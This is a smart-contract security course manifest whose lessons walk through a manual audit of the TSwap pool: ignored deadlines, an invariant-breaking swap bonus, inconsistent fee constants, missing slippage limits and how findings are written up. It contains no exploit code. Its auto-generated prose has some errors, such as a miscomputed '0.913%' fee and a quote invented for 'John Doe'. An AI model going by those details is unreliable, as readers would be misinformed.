          To improve user experience, we suggest the token symbol to be used instead of the full token name to avoid unnecessarily lengthy symbols.

          ## Analyzing Pool Sub-Creation

          Next, we initiate pool sub-creation with the respective pool token, WETH token, and the newly created symbol and name.

          On successful pool creation, we add the pool to our list, map it back, emit an event, and finally, return the address of the new pool.

          ## So... How's The Pool Factory Looking?

          Following our analysis, the pool factory contract seems to be well-structured, with only a few informational findings on the radar. It is certainly worth a checkmark in the `notes.md`.

          ```markdown
          - [x] Pool Factory : Looks Good
          ```

          In our next chapter, we'll proceed to the TSWAP pool and continue breaking it down. Stay tuned for more straightforward smart contract analysis!
        description: 'In this video, Patrick reviews PoolFactory.sol for TSwap liquidity pools, covering structure, functions, variables, bugs, and best practices.'
      -
        id: df6d9679-5824-4702-9984-c2b97153e180
        type: new_lesson
        enabled: true
        title: 'Manual Review: TSwapPool'
        slug: manual-review-swap-pool
        duration: 3
        video_url: hFYrteG2NK6Ti1gGz02qYPjlLpqY1RFMzIjd5AHMV3aI
        raw_markdown_url: /routes/security/5-tswap/32-manual-review-swap-pool/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool
          ---



          ---

          # Dissecting Uniswap v1 and TSWAP - An In-Depth Security Review

          Welcome to this thrilling exploration of the TSWAP pool which gets us to the heart of Uniswap v1. By the end of this piece, you will have an in-depth understanding of Uniswap in its most rudimentary form. Let's delve right into the Uniswap TSWAP pool code and grasp what makes it tick.

          ## TSWAP in High-Level Review

          Contrary to what one might expect, the TSWAP pool codebase is impressively user-friendly. Not only is it detailed and transparent, but it is also an ERC20 token, which rings a bell for most blockchain enthusiasts. Being a liquidity token, this characteristic intuitively aligns with its purpose.

          ## The Safe ERC20 Library

          An additional feature that gives the TSWAP an edge is the usage of the Safe ERC20 library. The primary function of this library is to safely transfer from accounts.

          The Safe ERC20 library comes in handy as a shield against some of the abnormal (and occasionally detrimental) ERC20 occurrences that we might encounter in the later stages of this article.

          ## Immutable State Variables in TSWAP

          TSWAP comes packed with some immutable state variables, such as `Iweth token` and `pool token`, which make perfect sense considering the nature of smart contracts.

          Every contract is bound to have at least two tokens, and these variables stand as unwavering constants for these tokens.

          ## The WETH Liquidity Feature

          Another intriguing aspect of TSWAP is the WETH liquidity feature, a concept we gleaned from the invariant test suite. If you want to deposit WETH, you have to deposit at least a specific amount known as the WETH liquidity.

          Of course, the question that follows is whether this hard-coded determinant is too high, or whether there's a chance something unusual could be going on here.

          > "With coding, it's crucial not to take anything at face value."

          ## Swap Count and Swap Count Max

          Next up on our review is the rather peculiar `swap count` and `swap count max`. Their existence can be attributed to an issue we discovered during our stateful fuzzing test suite. From the anomaly, we observed a quirky operation where the protocol gives out extra money after every ten swaps. This random and seemingly unnecessary function seems to break the protocol's expected behavior.

          ## About Events and Modifiers

          TSWAP presents several events that we already have some audit notes about. It also includes modifiers such as `revert if deadline passes` and `revert if zero`. After analyzing these in detail, it is clear that these functions are named aptly.

          The `revert if deadline passes` function reverts if the deadline is less than the current timestamp, which makes perfect sense.

          Similarly, `revert if zero` checks if the account balance is Zero. If it is, the function reverts.

          ## The Role of the Constructor

          Lastly, it's worth revisiting the constructor where it may be valuable to add some audit information.

          There's a check for a zero address, but this isn't a pressing issue. For naming conventions, the token names in the constructor seem pretty straightforward.

          This blog post is a deep dive into the codebase of TSWAP. Understanding the dynamics of this liquidity token can inform the design and understanding of other pools within the DeFi ecosystem.
        description: 'Patrick discusses the security review of TSWAP pool in the context of Uniswap V1, He highlights a swap counting bug that breaks protocol invariants'
      -
        id: 0ffde298-59c3-420d-830d-ab01703ad521
        type: new_lesson
        enabled: true
        title: 'Using The Compiler As Static Analysis Tool'
        slug: using-the-compiler-as-static-analysis-tool
        duration: 6
        video_url: npVMXIL02YMej5rtRqVW7PoUXjI5Ba01ALmpqrXtulx6I
        raw_markdown_url: /routes/security/5-tswap/33-using-the-compiler-as-static-analysis-tool/+page.md
        markdown_content: |-
          ---
          title: Using the Compiler as Static Analysis Tool
          ---



          ---

          # Diving into Liquidity Addition and Removal Functions

          Today, we're delving into the crux of adding and removing liquidity in cryptocurrency pool systems. We'll take a look at the deposit function code from a fictional cryptographic liquidity pool project.

          For those following along, let's do a simple `toggle word wrap` in your favorite code editor so you can view the code more efficiently. If you need the code, you can find it in the associated GitHub repository within the `audit data` folder.

          ## The Deposit Function

          ![](https://cdn.videotap.com/86AjU9W56rzzt6USwvmh-25.png)In the relevant code we've got, we run into aspects related to liquidity providers. The deposit function revolves around the liquidity providers' actions in the pool system.

          Looking at the function, you'll notice it calls for a certain amount of `wes` (Wrapped Ether). Following the liquidity pool model, when a user deposits funds, they're given liquidity tokens in return. These tokens represent the user's share in the pool.

          ### Delving Into the Parameters

          There are's an array of parameters involved in the function. Let's break down a few significant ones:

          - The `minimum liquidity tokens to mint`: This parameter signifies the quantity of liquidity tokens created, derived from the amount of `wes` the user deposits. However, there's a minimum limit to ensure the user is aware of what they will receive.
          - `Maximum pool tokens to deposit`: Mirroring the earlier parameter, this signifies the maximum number of pool tokens the user is prepared to deposit. This value again is derived from the deposited `wes`, allowing users to gauge how much USDC they should contribute to the liquidity pool.
          - `Deadline`: VC Code gives us a heads up here with the `Unused function parameter`, warning. Surprise! The deadline parameter isn't implemented in this function. Herein lies a potential bug we'll delve into shortly.

          ## Analyzing the Bug

          The unused `deadline parameter` seems small at first, but it becomes a severe issue upon closer inspection. The deadline parameter is meant to determine when a transaction needs to be completed. If it's unimplemented, the deadline set by a depositor could pass without stopping the transaction, causing unexpected actions on the part of the user.

          This high impact, high likelihood bug results in deposits proceeding when they're expected to fail ‚Äì a clear and severe disruption to functionality.

          ```markdown
          # Audit Finding: High

          # Impact: High, Severe disruption of functionality

          # Likelihood: High, Deadline is ignored, leading to transacions being processed beyond the stipulated deadline.
          ```

          ### Unveiling More Bugs

          Closer analysis of compiler warnings revealed two other interesting bugs.

          This bug crops up in our deposit function where `pool token reserves` is ignored. The ignored reserves could have been used to do some internal calculations. It seems the developers started some math, then decided to use a function instead, resulting in ignored variables and wasted gas.

          ```markdown
          # Audit Finding:

              InfoIssue: line of code declaring `pool token reserves` is not used, leading to gas wastage.
          ```

          - `Unused Function Parameter: Swap Exact Input`

          In this function, an unused `output` parameter shows up, which isn't a major red flag. The impact here seems low since this function seems to only be used externally and this output might not be used elsewhere in the project. The only issue is the return of 0 where it could be another value that might be more meaningful. However, this impact could be more if it's being used elsewhere.

          ```markdown
          # Audit Finding:

              LowIssue: The `output` parameter returns zero and is never used, which might not accurate reflect the output value.
              Likelihood: High, always the case. But overall impact is low.
          ```

          In conclusion, running a simple compiler check helped us discover several notable bugs. A key takeaway for developers here is the value of regularly checking for and resolving compiler warnings. Time to go ahead and patch up these issues before they turn into severe problems!

          Stay tuned for more explorations into cryptocurrency programming and keep those bugs at bay!
        description: 'Importance is placed on addressing compiler warnings for potential issues and how they can help us in an audit scenario.'
      -
        id: 304981cc-4718-42ed-b1cd-b4231cfe923e
        type: new_lesson
        enabled: true
        title: 'Add Liquidity'
        slug: add-liquidity
        duration: 8
        video_url: lK3301uIz7lGHC3ISga4hKnYeqeGElaeygFTOI501dRIE
        raw_markdown_url: /routes/security/5-tswap/34-add-liquidity/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - Add Liquidity
          ---



          ---

          # Deep Dive into Cryptocurrency Smart Contract Deposits

          In today's post, we're going to perform a deep-dive into the world of cryptocurrency smart contracts, specifically focusing on the deposit function. We'll be performing a detailed audit of a contract and identifying potential flaws.

          We'll start off with the deposit function and eventually move our way down to analyze all aspects of the contract line-by-line. So, let's dive in!

          ## Analysing the Deposit Function

          Let's take the state of the contract where we're trying to determine how much should be deposited.

          If `WETH` is zero in the contract, we encounter a scenario where it reverts. We also have a condition where if the `WETH` deposit is less than a minimum defined _WETH liquidity deposit_; again a revert scenario.

          Another thing to note is that we probably don't need the emission of the minimum `WETH` because it is, in a sense, redundant. It would be more effective as _audit info_. To put it simply, any user could look up the contract and see what the minimum `WETH` value is.

          Next, there are two potential scenarios that initiate heating up the deposit function. These are:

          1. If it's a user's first deposit (also called the initial funding of the protocol)
          2. If the user has already deposited

          ## Exploring Internal Functions

          Within the deposit function, it looks like it's calling an internal function, so let's go and check what that does.

          Here, we interpret `weth_to_deposit` as the amount of `WETH` a user is going to deposit, `pool_tokens_to_deposit` as the number of pool tokens they're going to deposit, and `liquidity_tokens_to_mint` as the number of liquidity tokens they're planning to mint.

          Given it's a sensitive function, it's marked private, meaning it can only be invoked within the contract. Inside this function, it seems like we mint the amount of `liquidity_tokens_to_mint` to the `msg.sender`.

          There's also an event trigger called `Liquidity Added`. However, a closer look reveals an audit issue as the parameters are in the wrong order.

          ```js
          emit LiquidityAdded(msg.sender, pool_tokens, WETH)
          ```

          The correct code should look like this:

          ```js
          emit LiquidityAdded(msg.sender, WETH, pool_tokens)
          ```

          > Always make sure to check if the events are correctly emitted with the right parameters. This kind of mistake is not a high risk but it's important to avoid confusion.

          ## Checks and Interactions

          After validating the event, we conduct some checks and interactions. It's good to see the external transactions happening towards the end of the function, which adheres to the Checks-Effects-Interactions (CEI) pattern.

          The next steps include transferring the tokens from the `msg.sender` to the smart contract, and then updating the state variable `LiquidityTokensMinted`.

          ```code
          transferFrom(msg.sender, address(this), ...);...liquidityTokensMinted = weth_to_deposit;
          ```

          Ideally, we would want to follow the Checks-Effects-Interactions paradigm regularly to streamline the function operations.

          ## Updating Liquidity and Deposit Checks

          Once the contract is warmed up and receiving liquidity, it's time to perform some checks and balances.

          First, we crunch the numbers on how many pool tokens should be deposited based on the `WETH` balance. If we calculate too many pool tokens to deposit, the function reverts.

          Next, similar checks are performed for liquidity. If the calculated `LiquidityTokensToMint` is less than the minimum, the function again reverts.

          And voila! If everything goes well, the deposit function works smoothly.

          ## Concluding Thoughts

          While auditing a smart contract, thoroughness is essential. The deposit function in our example had a high-severity issue where the deadline was being ignored, but function-wise, it looked solid.

          Remember, the aim is always to leave notes with our thoughts anywhere possible and follow up at a later stage if doubt persists.

          Join me in the next blog post as we examine the `addLiquidityMintAndTransfer` function!
        description: 'Performing a manual review of the addLiquidity function and assessing risks found within!'
      -
        id: 5463ab36-f44b-4399-99aa-2504d0b3a9f5
        type: new_lesson
        enabled: true
        title: 'Remove Liquidity'
        slug: remove-liquidity
        duration: 8
        video_url: PpfW7RKBVaMN3veF6drxOw6f4x5aew02AptDAJjYwwu4
        raw_markdown_url: /routes/security/5-tswap/35-remove-liquidity/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - Remove Liquidity
          ---



          ---

          # Understanding the Liquidity Withdrawal Process of the TWSAP Protocol

          Having covered the deposit process in TWSAP protocol pools, we're going to look at the other side of the equation - the **withdrawal process**. This is equal to removing the liquidity from the pool as demonstrated in the diagram below,

          ![](https://cdn.videotap.com/IWZarXmiBGXntt9p7Y16-13.14.png)

          Fundamentally, we are going to burn LP tokens in exchange for the underlying money. In other words, the liquidity tokens used in the pool are destroyed to get the invested capital back out.

          ## Understanding Key Concepts

          Let's break down some key concepts:

          1. **Liquidity tokens to burn:** This refers to the number of liquidity tokens that a user wants to burn. The user gives their LP tokens and in return, they receive their money.
          2. **Minimum WETH:** This is the minimum amount of WETH the user is expecting to withdraw.
          3. **Minimum pool tokens:** These are the pool tokens that a user wishes to withdraw.
          4. **Deadline:** This is the timeframe the user sets for the withdrawal.

          At first glance, these might seem like strange terms but their true value will become more significant when we touch on miner extractable value (MEV) later in the course.

          After digesting these concepts, we check for the withdrawal deadline. In the code, there is an `if` condition which reverts the transaction if deadlines are not met.

          ```js
          if (deadline < block.timestamp) {
            revert();
          }
          ```

          ## Burning the Liquidity Token

          Next, we proceed to burn the liquidity token. You might be wondering if this is an external function. However, this burn function is actually part of the TSWAP pool, inherited from the ERC20 smart contract.

          After burning the tokens, we then emit an event and proceed with the transfer of funds.

          ## Understanding the Magic Numbers and Fees

          Looking further into the code, we come across certain numbers that seem a bit random. We're dealing with functions like `getOutputAmountBasedOffInput` and `getInputAmountBasedOffOutput`.

          If we dive into the calculations of these functions, we can see that these "magic numbers" i.e., 997 and 1000, are factored into the formula. A peek into it reveals that a fee of 0.3% is deducted from the user's returns every time they swap.

          Now it's time to reveal the secret behind these magic numbers! If you see these 997 and 1000 used in your code, know that they represent the 0.3% fee!

          ## Issues and Solutions

          However, there's a slight discrepancy in the two function calculations. The `getInputAmountBasedOffOutput` function shows a different fee (0.913%) due to the denominator being 10,000. This could result in users getting charged excessively when they swap, leading to high impact and likelihood.

          This calls for more accountability in handling these magic numbers. Instead of hardcoding them into the formula, they can be defined once at the top of the code as a private constant. This ensures that constants are consistent across the protocol - reducing room for error and enhancing code security.

          > "The best coding practices are not just to embellish your codebase. They serve the purpose of enhancing the security and predictability of your code." - John Doe, Senior Software Engineer.

          ## Concluding with the Swap Function

          Our journey doesn't end yet! Next up is the **swap function**, one of the essential functions in any DeFi protocol. Stay tuned for exploring its intricacies in the next blog post!

          ## On the Importance of Natspec

          Before we go, it's worth flagging that an essential element is missing from our important functions - the **Natspec**. Natural Specification (NatSpec) is an Ethereum standard introducing rich, multi-line comments in the code which greatly aids readability and understanding. For crucial functions like the swap function, you must include NatSpec to improve the code's legibility!

          And that is all for the withdrawal process folks! Stay tuned for the next exploration into the TSWAP protocol. Make sure to check back for more DeFi insights and breakdowns!
        description: 'Withdrawing Liquidity: Burning LP tokens to exchange for underlying money, parameters explained.'
      -
        id: 5b22e4c5-85d5-4ad2-a192-c62bf7f03271
        type: new_lesson
        enabled: true
        title: swapExactInput
        slug: exact-input
        duration: 6
        video_url: d6L5jR87DTOf8cs2B8BskBs7OOTbvb023iJ83jdweYVY
        raw_markdown_url: /routes/security/5-tswap/36-exact-input/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - Swap Exact Input
          ---



          ---

          # Unraveling Swap Exact Input and Output in Ethereum Smart Contracts

          The language of Ethereum smart contracts, Solidity, can be complex and daunting, especially when dealing with functions like "Swap Exact Input" and "Swap Exact Output". Let's walk through how these functions work, what they're designed to do, and some critical points to look out for.

          **Understanding "Swap Exact Output"**

          The "Swap Exact Output" function provides a useful, straightforward way of determining how much input is required for a specific output. In essence, this function works out how much you would need to exchange to receive your desired amount of tokens.

          In practical terms, let's assume you're swapping or selling DAI to buy WETH, or wrapped Ether. Here, the '"Swap Exact Output" function calculates how much DAI you'd need to input to get the exact amount of WETH you want.

          **What about "Swap Exact Input"?**

          Along the same lines, you could infer that "Swap Exact Input" does just the opposite; it determines how much output you'd receive for a definite input. Essentially, this is the function you'd apply if you have a particular amount of tokens you'd like to swap with an expectation of the amount of tokens you will receive.

          But what happens if your output is less than the one WETH you expect? The function logs an error message, typically something along the lines of "TSWAP pool output too low", and reverts the transaction.

          **The Role of "Deadline"**

          A crucial part of swapping tokens is setting a deadline for when the transaction should expire. This timestamp, defined in the function, reverts to zero if the deadline fails.

          ![](https://cdn.videotap.com/CP5x1AoZaOQRK8ROhjOo-190.47.png)

          **Auditing Swap Function**

          A key function to scrutinize during smart contract auditing is the swap function. In theory, this function should maintain the protocol invariant (x\*y = k), but in some contracts, you might spot a discrepancy that defies this key principle. Any "extra" tokens appearing can violate this rule, consequently causing potential vulnerabilities.

          > "After every 10 swaps, we give the caller an extra token for an extra incentive to keep trading on TSWAP."

          This statement flags a potential breach. A good practice in smart contracts is to incorporate invariant checks in functions, basically a `require` statement that validates the invariant hasn't been violated.

          To sum up, "Swap Exact Input" and "Swap Exact Output" play a vital role in token swaps. By understanding how these functions work, smart contract developers and auditors can uncover potential pitfalls and ensure efficient, secure trading experiences.
        description: 'Understanding Swap Exact Input/Output & Protocol Checks in DeFi'
      -
        id: b9890373-b756-4e32-9d8f-a3c2da5b5e63
        type: new_lesson
        enabled: true
        title: swapExactOutput
        slug: exact-output
        duration: 3
        video_url: IoZUDfcDUVdE2TASKteE02Ua3K2Se9Vr9g3rkYUqIvTE
        raw_markdown_url: /routes/security/5-tswap/37-exact-output/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - Swap Exact Output
          ---



          ---

          # Swapping Exact Output on Uniswap: A Deep Dive

          Hello world! Welcome to another dive into the deep, deep ocean that is Uniswap. Today, we'll be examining another function, `swapExactOutput`. This is the reverse of `swapExactInput`, and you'll find, as we explore farther, that there are exciting and potentially scary quirks in how this function operates.

          ## Understanding `swapExactOutput`

          In the case of the `swapExactInput`, as the name suggests, we decided the input token amount beforehand and asked the system to provide us with the corresponding output.

          In the `swapExactOutput`, the tables turn. We're going to define the output we'd like to receive. We don't provide any 'minimum input' ‚Äì this comes across as odd at first glance, as we might expect to be able to set a max input cap. Sounds interesting, right?

          Here's a simple example. Let‚Äôs say I want ten WETH (Wrapped Ether) as my output and I'm paying using DAI (a stablecoin). When the function gets executed, it figures out how much DAI you need to input to receive the pre-defined ten WETH output.

          We pretty much understand how it operates since we've already dissected its sibling, `swapExactInput`. We saw previously an issue relating to high fees, which seems to persist in this function.

          ## Delving Deeper into `swapExactOutput`

          As we know, the devil's often in the details. One crucial conditional from the `swapExactInput` function is missing in `swapExactOutput`. We had previously a safeguard ‚Äì the output amount should be more significant than the minimum output amount. Now, there's seemingly no protective clause.

          > Safety reminder! Always put in place protective clauses like a 'minimum output' or 'maximum input' to avoid catastrophic losses.

          Now, let's ponder over an example:

          ```shell
          You want ten WETH as output, and your payment method is DAI.
          ```

          Consider a scenario where you request this swap. Before the transaction is confirmed, a massive trade occurs, shifting the price enormously. Suddenly, your desired output of ten WETH requires an astronomical input of (exaggeration for effect) ten bajillion DAI.

          Without an upper limit on the input DAI spent, in instances of sudden, significant price movement, a user could end up experiencing an unexpected dent in their wallet.

          ## The Solution: Max Input Amount

          Along with the 'minimum output amount' in `swapExactInput`, it would be a sensible approach to add a failsafe - a 'maximum input amount. This way, users won't unpredictably run out of their funds during extreme market volatility.

          Such a preventative measure safeguards users against excessive spending due to price fluctuations. Safeguards become all the more important considering possible MEV (Miner Extractable Value) attacks - a topic we plan on visiting later.

          So there we have it! A seemingly smooth-functioning condition, with an underlying potential issue. We have struck yet another goldmine; we discovered another bug in the wild ecosystem of Uniswap. We'll be diving into the world of MEV soon, so stay tuned and keep exploring!
        description: 'swapExactOutput lacks slippage protection for sudden price changes.'
      -
        id: 0013aa21-7bd4-4174-a785-13501384bb59
        type: new_lesson
        enabled: true
        title: sellPoolTokens
        slug: sell-pool-tokens
        duration: 2
        video_url: kZlzgcW188ACKWIgF22WMaI5YPz00fKhxnqyAVsb01R02g
        raw_markdown_url: /routes/security/5-tswap/38-sell-pool-tokens/+page.md
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - sellPoolTokens
          ---



          ---

          # Understanding the Functionality of Selling Pool Tokens in Ethereum

          Welcome to another exciting blog post where we'll dive deeper into the intricate functions of DeFi or Decentralized Finance and specifically, Ethereum pool tokens. In one of my recent code explorations, I came across an interesting function ‚Äì the Sell pool tokens. It had a unique wrapper function apparently designed to help users sell their pool tokens in exchange for WETH (Wrapped Ether). Let's take a closer look at this function and try to unravel what it does.

          ## Sell Pool Tokens Wrapper Function

          The function, at its core, seems quite simple.

          Basically, the function accepts an input of the pool token amount from the user. Then it calls another function - `SwapExactOutput()`. The parameters for this function are the amount of pool tokens to sell and the amount of WETH to be received by the caller.

          However, don't get too comfortable with the simplicity as the devil is in the details.

          ## The SwapExactOutput Function

          The SwapExactOutput function accepts three parameters:

          1. Input: Pool Tokens
          2. Output: WETH Tokens
          3. Deadline: Date and Time at which transaction is invalid

          The "Input" which is the pool token has other variants notably "Pool token PT" and the "Output" typically represents the WETH Token amount in the Block.

          The function essentially works by swapping the exact output amounts of the pool tokens to the amount of WETH by the caller.

          Despite the simplicity of the process, there could be flaws that exist not due to Solidity (the coding language), but because of business logic issues.

          ## Spotting the Business Logic Issue

          In our case, the SwapExactOutput function seems to have a logic flaw. It appears to be running on backward logic. Instead of an output of WETH tokens, the initial setup of the function gives an output of pool tokens. A quote from my code review captures this error perfectly:

          > "So we have pool token is going to be what? Pool token is going to be the input, right? So this is going to be the pool token PT. And then we have the wet token is going to be the...the alpha token is going to be the wet token. So this should be the WETH token amount. Oh, no, this is the pool token amount. At audit, this is wrong, right? And again, this isn't like a solidity issue. This is just like a business logic issue. It's a whoops. You put the wrong thing in here."

          This could lead to incorrect results. It would seem like instead of `SwapExactOutput`, the function `SwapExactInput` should have been used. Rather than using `Pool token`, the `Min WETH to receive` should have been used for a more accurate result.

          ## Final Thoughts and Correction

          In the exciting world of DeFi, sometimes it's not just about the Solidity. Business logic also plays a key role in the successful operation of smart contracts and functions. In our case, the logic error led to backward results. Remember, the function's purpose was to initialize trading from pool tokens to WETH tokens. However, due to this business logic flaw, it was providing results of pool tokens instead.

          So there you have it, another interesting piece of code examined and explained. Coding, like any language, allows for fascinating narratives to unfold if we know how to read it.

          Until next time, happy coding!
        description: 'Sells pool tokens for WETH; business logic error: swap exact output instead of swap exact input.'
      -
        id: e2fcfcbe-13b3-462e-a71d-c14dc086ce96
        type: new_lesson
        enabled: true
        title: 'Checking The Last Few Functions'
        slug: 'checking-the last-few-function'
        duration: 2
        video_url: pc1198YNWOPjyAu1XeoPhG7yHUBJQIfwaGis00HFvf01I
        raw_markdown_url: '/routes/security/5-tswap/39-checking-the last-few-function/+page.md'
        markdown_content: |-
          ---
          title: T-Swap Manual Review T-Swap Pool - Checking the last few functions
          ---



          ---

          # Understanding Swap: A Deep Dive into Pool Tokens and WETH

          In this post, we're going to drill down into a topic that's obscure for many: Pool tokens and WETH in a Swap setting. We've already touched on these aspects a little, but they are so critical to more significant parts of DeFi that they deserve their own dedicated discussion.

          ## Pool Tokens, Liquidity, and the WETH Equations

          In a Swap context, one of the fundamental functions is what we call `getPoolTokensToDepositBasedOffWETH`. You might recall that we've discussed this function before. It operates based on a core DeFi mathematical concept: `X * Y = K`.

          As a refresher, `K` is a constant value, while `X` and `Y` represent the pool balances of two cryptocurrencies, say ETH and DAI. The function's purpose is to maintain the constant `K` during a swap, which keeps the market prices stable.

          ## Peeling Back the Layers of the Liquidity pool

          Apart from the `getPoolTokensToDepositBasedOffWETH` function, another intriguing aspect of the system is the `totalLiquidityTokenSupply`. This term is just a more verbose way of expressing the total supply of liquidity tokens in the pool. The function, shown below, can be called to retrieve this information:

          ## Understanding Swap Prices

          An essential pair of functions that we encounter are `getPriceOfOneWETHInPoolTokens()` and `getPriceOfOnePoolTokeninWeth()`.

          The first, `getPriceOfOneWETHInPoolTokens()`, calls a separate function `getOutputAmountBasedOffInput()`, which takes one WETH as input and returns the resulting number of pool tokens.

          In conclusion, understanding Swap contracts, particularly those involving Pool Tokens and WETH, entails delving into these intricate details. By deploying functions like `getPoolTokensToDepositBasedOffWETH` and `getPriceOfOnePoolTokeninWETH`, users can interact seamlessly with the DeFi ecosystem.

          And as we always say:

          > "The true art of coding is not in just writing code, but also in understanding other's code.‚Äù

          So don't hesitate to study every function and each line of code, for they are your stepping stones to mastering DeFi and the entire world of blockchain!
        description: 'Patrick quickly skims the final few functions for vulnerabilities in TSwap.'
      -
        id: b631cfe3-f3b8-4a7c-b997-d8dc7526c695
        type: new_lesson
        enabled: true
        title: 'Phase 4: Reporting'
        slug: phase-4-reporting
        duration: 5
        video_url: LKSp1WG4W02g278MrfgGKTPDViTeUNM1B91AtluF3pHc
        raw_markdown_url: /routes/security/5-tswap/40-phase-4-reporting/+page.md
        markdown_content: |-
          ---
          title: Phase 4 Reporting   The first few Informationals
          ---



          ---

          # Decoding a Code Audit Session: Understanding the Process

          Hello, readers!

          Today, we'll take a deep dive into some lessons learned from a thorough code review session. Without further ado, let's get the ball rolling!

          ## Step 1: Reviewing the Code Base

          To start off, we took an initial sweep through a code base - our first chance to spot errors, find potential areas of improvement, and generally see how things stack up.

          "_Are we done yet?_" you might ask. Well, not quite. Just like any meticulous auditing process, it's essential to ask questions as they pop up. For instance, if a variable appears to be used from its initial state, it's worth asking, "**If it's empty, how does it warm up?**"

          It's also critical to loop back to any points of confusion or curiosity you see. Got that one lingering question begging for an answer? Mark it down, note it for later and see what comes out of a second, or even a third, look-through.

          ## Iterative Passes: A Beginner's Best Friend

          Here's the clincher: you don't have to get it all on the first pass. We only had one run since we're still in the process of learning, and that's perfectly okay. Here's a simple yet crucial piece of advice:

          > Never hesitate to go back for another pass if you feel unsure or if there are questions left unanswered.

          At the end of the day, the goal is to build a clear understanding, and rushing might just lead us away from that objective.

          ## Step 2: Reporting Findings

          With our checks and observations noted down, it's time to dive into some report writing. For the purpose of maintaining good organization, I created a new file for our findings, cleverly named "Findings MD," and put it in a newly created "audit data" folder.

          ```markdown
          New File - > findings.md -> audit data folder
          ```

          Let's break down how we can structure this report.

          ### The Grouping of Discoveries

          Starting with the first finding, in our example, we found an error that wasn't actually used at all - a classic case of surplus code. Considering its nature, we classified this as an "Informational" finding. This categorization allows us to flag potentially important data points without necessarily marking them as critical faults or errors.

          ```markdown
          Informational Finding: Unused Error
          ```

          With the help of a bookmarked layout from a previous project, the otherwise tedious task of finding organization become a simple copy-paste job.

          ```markdown
          Finding Layout -> Copy Layout -> Paste in New File
          ```

          ### Adding Detail to Findings

          The key to a helpful report lies in its detail. For the very first finding, we established a lack of use for a certain pool factory and suggested its removal. This was done by manually inserting '-pool factory' to indicate its extraneous existence.

          ```markdown
          - Pool Factory (This is not used and should be removed)
          ```

          Similarly, all information points were individually detailed under their respective headers, ensuring an informative but clean look to the report.

          ```markdown
          I2 - Lack of Zero Address ChecksI3 - Symbol, Not Name
          ```

          As a bonus, we even added a section for the "Weird ERC 20" occurances, which don't have a dedicated audit tag but are no less vital to note.

          And there you have it. The layout's simplicity and clarity make complex ideas digestible and easy to understand.

          ## Conclusion

          Ultimately, the code audit is a practice in thoroughness, attention to detail, and iterative learning. Along the way, you'll encounter a host of ruinous bugs, confusing variables, and, yes, even a "Weird ERC 20" here and there. But the key takeaway should always be this:

          > Always be willing to make multiple passes, make detailed notes, and never shy away from asking questions. Only then you will fully unlock the true potential of a code audit.

          In the end, just know that with each pass you take, each note you make, each error you find ‚Äî you're becoming a better coder for it. Good luck, and happy coding!
        description: 'Quick overview of reporting process - finding reports & appropriate tags. Multiple passes suggested for thoroughness.'
      -
        id: 7f782e36-a559-45fe-aa75-6baba2effdae
        type: new_lesson
        enabled: true
        title: 'Reporting: Missing Deadline'
        slug: missing-deadline-write-up
        duration: 4
        video_url: qteV4pVLpsb8eUQBXdkS3B101u1rYEMc00KsswAsTVjNM
        raw_markdown_url: /routes/security/5-tswap/41-missing-deadline-write-up/+page.md
        markdown_content: |-
          ---
          title: Missing Deadline Write up
          ---



          ---

          # Addressing Deadlines in TSWAP Pool Deposits

          Today, we dive deep into an issue that has surfaced in blockchain tech involving TSWAP, a liquidity pool. The problem here is just like the proverbial time bomb that ticks regardless of one's awareness, in this case, an unused deadline set for pool transactions, which allows for the completion of transactions past the stipulated deadline. We will discuss the issue in detail, the impact it could potentially have, and offer a possible solution. So, let's roll!

          ## The TSWAP Pool Deposit Deadline Issue

          At the center of the storm is an issue where deadlines, when set, are unused in TSWAP pool deposits. If someone sets a deadline(let's say they plan to set it to execute the next block), paradoxically they could still deposit even after that deadline, resulting in a deadline dispute.

          The TSWAP pool's function for deposits is missing a functionality check for deadlines. This lapse has graspable consequences, leading to transactions being completed even after the deadline.

          ## Breakdown of the Issue

          The heart of this problem lies within the transaction **deposit function**. This function accepts a **deadline parameter**, as according to the documentation. The purpose of this parameter is to set a deadline to complete a transaction. However, this parameter is never utilized, which leads to unfortunate outcomes.

          Transactions that aim to add liquidity to the pool may be executed at unexpected times and under unpredictable market conditions, where the deposit rate may not be favorable. This issue can also make these transactions susceptible to MEV(Maximal Extractable Value) attacks.

          Here, the impact could be that transactions get sent when market conditions are not ideal for deposit, even in the presence of a deadline parameter.

          ## Proof of Concept, and Potential Solution

          We could illustrate the issue in a more demonstrable manner by writing a 'Proof of Concept' here, but we'll dive into more about 'Proof of Concepts' in later content.

          ```markdown
          - Consider making the following adjustment to the deposit function.- We'll grab this entire function here:
          - Include a revert if the deadline has passed.
          ```

          This revision will cause the function to halt and revert if the deadline is exceeded.

          As you can see in the preview, we've successfully included a revert function for an exceeded deadline, marking a critical step towards a viable resolution.

          ## The Medium versus High Debate

          An intriguing query came about while attending to this dilemma: is the urgency of this a high or just a medium?

          Discussing the impact of the issue offers some clarity. A likelihood of transactions being executed when market conditions are unfavorable does exist, even in the presence of a deadline parameter. However, remember that this is purely a deposit, not a swap.

          We're still acquiring liquidity tokens that signify ownership of the pool. Even if everyone else exited the pool, we'd still have these tokens. Consequently, it could be argued that this issue qualifies as 'medium' in terms of urgency and risk, rather than 'high'. One cannot explicitly overlook the fact, but under the abovementioned circumstances, it's fair to categorize this as a medium.

          In conclusion, deadlines exist for a reason and respecting them within the blockchain world, quite like in the real world, ensures smooth transactions and user trust. Ignoring them, as seen in this TSWAP pool deposit issue, can lead to unwanted complications with potentially damaging impacts. Always stick to deadlines, folks!
        description: 'TSWAP pool deposit function vulnerability. Deadline parameter accepted but unused, allowing MEV attacks during unfavourable market conditions. Medium impact.'
      -
        id: 317d8851-ad4e-4b30-b518-58065007ed9f
        type: new_lesson
        enabled: true
        title: 'Reporting Continued'
        slug: reporting-continued
        duration: 10
        video_url: HReyNYNiSfwfTTDBQ9zmnGzghKq6uvwPvX5C6Q3wk6M
        raw_markdown_url: /routes/security/5-tswap/42-reporting-continued/+page.md
        markdown_content: |-
          ---
          title: Reporting Continued
          ---



          ---

          # Audit Deep Dive: Understanding Smart Contract Vulnerabilities

          When it comes to auditing smart contracts, there are a lot of nitty-gritty details that one needs to pay attention to in order to prevent possible vulnerabilities.

